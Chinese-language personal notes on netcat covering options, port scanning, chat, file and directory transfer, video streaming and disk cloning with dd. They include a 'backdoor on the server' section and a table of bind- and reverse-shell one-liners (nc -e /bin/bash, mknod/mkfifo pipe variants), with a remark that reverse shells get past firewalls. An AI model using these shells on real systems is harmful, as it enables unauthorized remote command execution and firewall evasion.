# nc

`netcat`, 简称`nc`  
`$ sudo yum install nmap-ncat`

## man

Ncat operates in one of two primary modes: connect mode and listen mode.  
In connect mode, Ncat works as a client.  
In listen mode it is a server.

In connect mode, the hostname ad port arguments tell what to connect to.  
hostname is required, and may be a hostname or IP address.  
If port is supplied, it must be a decimal port number.  
If omitted, it defaults to 31337.

In listen mode, hostname and port control the address the server will bind to.  
Both arguments are optional in listen mode.  
If hostname is omitted, it defaults to listening on all available  
addresses over IPv4 and IPv6.  
If port is omitted, it defaults to 31337.

## Protocol options

* -u, --udp (Use UDP). Use UDP for the connection (default is TCP)



## 1. 服务器上安后门

```bash
# 下面的命令，将在机器上开放5879端口。
$ nc -l -vv -p 5879 -e /bin/bash

# 远程就可以使用nc命令连接：
$ nc -v 192.168.8.96 5879
```
可执行任何shell命令。  

如果需要服务端在客户端退出后继续监听，使用参数`-k`。  

## 2. 文件和目录传送

可代替sftp与rzsz  

```bash
# 服务器同样监听一个端口，但是这次重定向到一个文件
$ nc -l 5879 > file

# 客户端可以直接发送文件
$ nc -v 192.168.8.83 5879 < nginx.tar.gz
```

```bash
# 传目录

# 接收端
$ nc -l 5879 | tar zxvf -

# 发送端
$ tar zcvf - nginx-1.1 | nc -v 192.168.8.83 5879
```

## 3. 网络连通性检测

```bash
# 判断端口是否开启
$ nc -vvv baidu.com 443

# 扫描开放端口
nc -vzw 2 192.179.8.8 8888-9999
```

概述

    nc : NetCat

    在网络工具中有“瑞士军刀”美誉, 功能实用, 被设计为一个简单, 可靠的网络工具, 可通过TCP或UDP协议传输读写数据.

    同时, 它还是一个网络应用Debug分析器, 因为它可以根据需要创建各种不同类型的网络连接

    可 单向通信 or 双向通信

    实质 不区分 server or client

常见命令行选项

    -l: 监听某个端口

    -k: keep listen, 永久

    -w: 超时秒数

    -v: verbose ? 显示指令执行过程 [YYR: 很有用, 如果不能 连接成功, 会有日志输出]

    -z: 使用 zero io, 即 0输入/输出模式, 只在扫描通信端口时使用

    -u: 下面列出的默认都是 tcp 连接, 如果需要 udp, 则要加 -u

    -U: unix域 socket 通信, 即本机内通信

主要功能

端口扫描

[root@backup ~]# nc -v -w 1 192.168.200.29 -z 20-30
nc: connect to 192.168.200.29 port 20 (tcp) failed: Connection refused
nc: connect to 192.168.200.29 port 21 (tcp) failed: Connection refused
Connection to 192.168.200.29 22 port [tcp/ssh] succeeded!
nc: connect to 192.168.200.29 port 23 (tcp) failed: Connection refused
nc: connect to 192.168.200.29 port 24 (tcp) failed: Connection refused
nc: connect to 192.168.200.29 port 25 (tcp) failed: Connection refused

总结：使用nc扫描速度真的不敢恭维, 而且对于扫描主机存活、端口等还是交给更专业的 nmap 来进行, 物尽其用才是硬道理, 这里全当科普

聊天

server2:
[root@server2 ~]# nc -l 1234 
hello!
hi!

server1:
[root@server1 ~]# nc  192.168.200.27 1234 
hello!
hi!

文件传输

    用途: 能否借助端口转发来跳传资料
    拷贝: server1 -> server2

#server2, 先监听
[root@server2 ~]# nc -l 1234 > 1234.txt

#server1, 再传输
[root@server1 ~]# cat abc.txt 
abc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txt

[root@server1 ~]# nc -w 1 192.168.200.27 1234 < abc.txt

#server2, 收到
[root@server2 ~]# cat 1234.txt 
abc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txtabc.txt

又

Server
$nc -l 20000 < file.txt
Client
$nc -n 192.168.1.1 20000 > file.txt

又
Server
$nc -l 20000 > file.txt
Client
$nc 192.168.1.2 20000 < file.txt

目录传输

Server
$tar -cvf – dir_name | nc -l 20000
Client
$nc -n 192.168.1.1 20000 | tar -xvf -

又
Server
$tar -cvf – dir_name| bzip2 -z | nc -l 20000

通过bzip2压缩
Client
$nc -n 192.168.1.1 20000 | bzip2 -d |tar -xvf -

加密传输

如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。
Server
$nc localhost 20000 | mcrypt –flush –bare -F -q -d -m ecb > file.txt

使用mcrypt工具加密数据。
Client
$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 20000

使用mcrypt工具解密数据。
以上两个命令会提示需要密码，确保两端使用相同的密码。
这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。

流视频

虽然不是生成流视频的最好方法，但如果服务器上没有特定的工具，使用netcat，我们仍然有希望做成这件事。
Server
$cat video.avi | nc -l 20000
这里我们只是从一个视频文件中读入并重定向输出到netcat客户端

Client
$nc 192.168.1.1 20000 | mplayer -vo x11 -cache 3000 -
这里我们从socket中读入数据并重定向到mplayer。

克隆硬盘或分区: 非常强大 !!!

    由dd获得硬盘或分区的数据，然后传输即可
    克隆硬盘或分区的操作，不应在已经mount的的系统上进行
    克隆: server1 -> server2

#server2, 先监听
[root@server2 ~]# nc -l -p 1234 | dd of=/dev/sda

#server1, 执行传输, 即可完成从server1克隆sda硬盘到server2的任务
[root@server1 ~]# dd if=/dev/sda | nc 192.168.200.27 1234

打开一个shell

    假设你的netcat支持 -c -e 参数 V6.40

Server
$nc -l 20000 -e /bin/bash -i

Client
$nc 192.168.1.1 20000
这里我们已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash

    正反连接
        目的: 本地机登陆远程机, 并能 本地命令行输入命令, 传到远程, 远程执行命令, 传回本地, 最终显示到命令行
        启动顺序: 都是先启动 server 端
        总结：这个情况是最常用的内网端口转发功能，这样反弹shell即可执行命令。反向连接就是常用的反弹shell到本地，因为由主机主动发送的情况本地防火墙等设备一般不会去拦截，而正向连接到远程主机的某端口常常被拦截

action	本地	远程
IP	192.168.8.222	192.168.8.80
正向连接_-e	nc -vv 192.168.8.80 8888	nc -vv 192.168.8.80 -lk 8888 -e /bin/bash
反向连接_-e	nc -vv -kl 8888	nc -vv -e /bin/bash 192.168.8.222 8888
正向连接_无-e	nc -vv 192.168.8.80 8888	mknod backpipe p; nc -vv 192.168.8.80 -lk 8888 0<backpipe | /bin/bash 1>backpipe 2>backpipe
反向连接_无-e	nc -vvv -kl 8888	mknod backpipe p; nc -vvv 192.168.8.222 8888 0<backpipe | /bin/bash 1>backpipe 2>backpipe
远程执行自动回传	命令1: nc -vv -l 8889 > aaa.txt& 命令2: echo "ls | nc 192.168.8.222 8889 " | nc -vv 192.168.8.80 8888	nc -vv 192.168.8.80 -lk 8888 -e /bin/bash

exec 8<>/dev/tcp/127.0.0.1/11211    #使用文件描述符8以<>(<读>写)方式，打开127.0.0.1的tcp11211端口
ls -l /proc/self/fd                                   #查看打开的连接8
echo -e "stats" >&8                             #向socket写入数据
cat <&8                                                  #从socket读入数据
exec 8<&-                                              #关闭socket读
exec 8>&-                                              #关闭socket写

    假设你的netcat 不支持 -c -e 参数

Server
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 20000 > /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i  | nc -l 20000 > /tmp/tmp_fifo

这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。
是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。
说明：
从网络收到的输入写到fifo文件中
cat 命令读取fifo文件并且其内容发送给sh命令
sh命令进程受到输入并把它写回到netcat。
netcat 通过网络发送输出到client
至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。

YYR:
  网络输入 -> nc -> fifo 
  cat fifo -> sh -> 执行完后其输出 -> nc -> 网络输出
  

在客户端仅仅简单连接到服务器
Client
$nc -n 192.168.1.1 20000
你会得到一个shell提示符在客户端


